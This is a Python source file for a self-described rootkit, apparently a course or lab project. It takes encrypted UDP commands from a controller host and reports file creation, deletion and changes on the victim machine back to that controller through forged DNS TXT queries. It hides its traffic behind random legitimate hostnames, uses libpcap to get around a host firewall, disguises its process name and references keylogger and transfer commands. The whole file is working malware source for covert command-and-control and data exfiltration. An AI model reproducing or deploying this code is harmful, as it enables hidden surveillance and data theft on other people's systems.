"""
    This is the rootkit program. It receives commands from the controller,
    decrypts them, executes them, and then returns a response via a DNS
    query.
"""

# Ignore warnings
from warnings import filterwarnings
filterwarnings("ignore")

# Standard Modules
import os
from random import randint
import argparse
import sys
import logging
import time
from pathlib import Path
from datetime import datetime

# Custom Modules
from utils.encryption import StreamEncryption, BlockEncryption
from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER
from utils.validation import validate_ipv4_address, validate_nic_interface
from utils.process import hide_process_name

# Third Party Libraries
from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler, LoggingEventHandler


PARSER = argparse.ArgumentParser("./rootkit.py")
PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
ARGS = PARSER.parse_args()


# Manually set scapy to use libpcap instead of bpkfilter.
# This is necessary to circumvent host-based firewall.
conf.use_pcap = True


if not validate_ipv4_address(ARGS.controller_ip):
    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
    sys.exit(1)

if not validate_nic_interface(ARGS.interface):
    print(f"Network Interface does not exist: '{ARGS.interface}'")
    sys.exit(1)


# Global Variables
CONTROLLER_IP = ARGS.controller_ip
NETWORK_INTERFACE = ARGS.interface
STREAM_ENCRYPTION_HANDLER = StreamEncryption()
BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
MONITOR_IDENTIFICATION = 14562
KEYLOG_IDENTIFICATION = 32586
GENERAL_MSG_IDENTIFICATION = 19375


# List of legit hostnames
HOSTNAMES = ["play.google.com",
             "pixel.33across.com",
             "signaler-pa.clients6.google.com",
             "www.youtube.com",
             "www.google.ca",
             "www.amazon.ca",
             "www.amazon.com",
             "safebrowsing.googleapis.com",
             "upload.wikimedia.org",
             "hhopenbid.pubmatic.com"]


# Initialize the encryption context.
STREAM_ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
STREAM_ENCRYPTION_HANDLER.read_secret("data/secret.key")
STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")


# Defining the default event handling code for files.
def on_created(event):
    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", identification=MONITOR_IDENTIFICATION)
    send_dns_query(query)

def on_deleted(event):
    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", identification=MONITOR_IDENTIFICATION)
    send_dns_query(query)

def on_modified(event):
    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", identification=MONITOR_IDENTIFICATION)
    send_dns_query(query)

def on_moved(event):
    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", identification=MONITOR_IDENTIFICATION)
    send_dns_query(query)


class FileSystemMonitor():

    __FILE = 1
    __DIRECTORY = 2
    __INVALID = 3

    def __init__(self, path=None):
        self.__path = None
        self.__threads = [] # List of threads watching directories.


    def shutdown(self):
        """
            Goes through all threads and shuts down each one.
        """
        for thread in self.__threads:
            thread.stop()
        for thread in self.__threads:
            thread.join()


    def __validate_path(self, path) -> int:
        """
            Checks if the given path is valid and returns a code
            which tells the programmer if the path points to a file, 
            directory, or is invalid.
        """
        if os.path.isdir(path):
            return self.__DIRECTORY
        elif os.path.isfile(path):
            return self.__FILE
        return self.__INVALID


    def __get_parent_directory(self, path) -> str:
        """
            Takes a path to a file as input, and returns the parent directory.
        """
        p = Path(path)
        return p.parent.absolute()


    def monitor(self, path: str):
        """
            Check if path is invalid, directory, or file.
        """
        code: int = self.__validate_path(path)
        if code == self.__INVALID:
            print(f"Path does not exist: {path}")
            exit(1)
        if code == self.__FILE:
            print(f"File: {path}")
            # Defining event handler which will only emit file specific events.
            event_handler = PatternMatchingEventHandler(patterns = [os.path.basename(path)],
                                                        ignore_directories=True,
                                                        ignore_patterns=None,
                                                        case_sensitive=True)
            event_handler.on_created = on_created
            event_handler.on_deleted = on_deleted
            event_handler.on_modified = on_modified
            event_handler.on_moved = on_moved
            parent_dir = self.__get_parent_directory(path)
            observer = Observer()
            observer.schedule(event_handler, parent_dir, recursive=False)
            observer.start()
            self.__threads.append(observer)
            return
        elif code == self.__DIRECTORY:
            print(f"Directory: {path}")
            # event_handler = LoggingEventHandler()
            # observer = Observer()
            # observer.schedule(event_handler, path, recursive=False)
            # observer.start()
            # self.__threads.append(observer)
            return


class DirectoryNotFound(Exception): pass


def get_random_hostname():
    size = len(HOSTNAMES)
    index = randint(0, size-1)
    return HOSTNAMES[index]


def receive_udp_command(pkt):
    msg_len = pkt[UDP].len
    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
    msg_bytes = STREAM_ENCRYPTION_HANDLER.decrypt(ciphertext)
    msg = msg_bytes.decode("utf-8")
    return msg


def send_dns_query(query):
    """
        Send dns query.
    """
    send(query, verbose=0)


def forge_dns_query(data: str, indentification: int):
    """
        Forge dns query.
    """
    hostname = get_random_hostname()
    encrypted_data = b""
    if len(data) > 255:
        print("ERROR: Can't fit more than 256 bytes in TXT record!")
        print("Truncating data...")
        truncated_data = data[0:255]
        encrypted_data = STREAM_ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
    else:
        encrypted_data = STREAM_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
    # Forge the DNS packet with data in the text record.
    query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
    return query


def execute_watch_command(path: str) -> bool:
    if not os.path.exists(path):
        query = forge_dns_query(data=f"ERRORMSG: Path: {path} does not exist.", indentification=GENERAL_MSG_IDENTIFICATION)
        send_dns_query(query)
        return False
    # Register the path to monitor.
    MONITOR.monitor(path)
    query = forge_dns_query(data=f"Path '{path}' will be monitored.", indentification=GENERAL_MSG_IDENTIFICATION)
    send_dns_query(query)
    return True


def packet_handler(pkt):
    """
    
    """
    if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
        return
    command = receive_udp_command(pkt)
    print(f"Received: {command}")
    argv = command.split(" ")
    argc = len(argv)
    if argc == 2:
        if argv[0] == WATCH:
            execute_watch_command(argv[1])


MONITOR = FileSystemMonitor()

if __name__ == "__main__":
    hide_process_name("systemd-userwork-evil")
    sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
